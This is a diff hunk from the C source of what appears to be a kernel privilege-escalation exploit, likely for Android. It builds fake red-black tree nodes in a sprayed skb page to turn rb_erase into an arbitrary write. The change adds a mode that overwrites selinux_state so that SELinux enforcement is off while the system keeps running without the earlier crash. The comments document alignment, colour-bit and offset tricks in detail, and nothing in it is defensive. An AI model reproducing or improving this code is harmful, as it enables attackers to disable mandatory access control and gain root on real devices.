@@ -790,28 +790,35 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           fake_right = payload_base + FAKE_CRED_OFF;
           pselect_custom_value = fake_right;
         } else if (pselect_custom_write == WRITE_MODE_CRED_SELINUX) {
-          /* Write 7 plan 0: 8-byte ZERO at selinux_state.
-           * rb_erase Case 1 with child == NULL stores NULL into
-           * parent->rb_right == TARGET and then sets
-           * rebalance = __rb_is_black(pc) ? parent : NULL: with the
-           * victim pc BLACK (bit0 = 1, see RB_BLACK in
-           * rbtree_augmented.h - the |1 convention used by the cred
-           * plans is BLACK!) the color walk would run and dereference
-           * the fake parent's rb_left/rb_right as tree nodes. The
-           * cred plans never hit this because their child != NULL
-           * short-circuits rebalance to NULL regardless of color. For
-           * the ZERO write the victim pc must be RED: bit0 CLEAR,
-           * target-8 must stay 4-aligned (the target is 8-aligned).
-           * Zeroing selinux_state[0..7] clears enforcing(+0),
-           * checkreqprot(+1), initialized(+2) and policycap[0..4]:
-           * avc_denied() never returns -EACCES (enforcing=0) and
-           * security_compute_av() short-circuits to allowed=0xffffffff
-           * when !initialized - full permissive, both gates at once.
-           * The value MUST stay 0: any nonzero VALUE would be written to
-           * *TARGET as a pointer (two-store Case) whose low byte is
-           * nonzero - enforcing would stay set. */
-          fake_right = 0;
-          pselect_custom_value = 0;
+          /* Write 7 plan 0: the selinux_state write.
+           *
+           * Default (value 0) = the old 8-byte ZERO: rb_erase Case 1 with
+           * child == NULL stores NULL at TARGET; pc must be RED (bit0
+           * clear) or the colour walk dereferences the fake parent. It
+           * clears enforcing(+0), checkreqprot(+1), initialized(+2) and
+           * policycap[0..4]. Permissive, but initialized=0 breaks
+           * security_secid_to_secctx() -> binder -EINVAL -> framework
+           * dies (the observed reboot).
+           *
+           * GHOST_ENFORCE_INIT=1 = store a page-aligned address of OUR
+           * reclaim page instead: byte0 = 0 (enforcing=0), byte2 is the
+           * page's phys bits 16..23 which is nonzero with probability
+           * 255/256 -> selinux_initialized() (a normalized bool) stays
+           * true, so secid_to_secctx/binder keep working. child != NULL
+           * makes rebalance NULL (colour walk skipped); the extra
+           * `child->__rb_parent_color = pc` store lands in the unused
+           * SELFTEST scratch area of our own page. policycap[0..4] get
+           * the pointer's upper bytes (nonzero -> caps enabled), which
+           * is harmless while enforcing=0. */
+          if (env_flag("GHOST_ENFORCE_INIT", 0)) {
+            fake_right = payload_base + SELFTEST_OFF;
+            pr_info("selinux write value=%016zx (page-aligned, keep initialized)\n",
+                    (size_t)fake_right);
+          } else {
+            fake_right = 0;
+            pr_info("selinux write value=0 (legacy zero-write)\n");
+          }
+          pselect_custom_value = fake_right;
         } else if (pselect_custom_write == 5 && !pselect_custom_target) {
           /* Self-test: write page+SELFTEST_VALUE into page+SELFTEST_OFF.
            * Nothing outside the spray page is touched. */
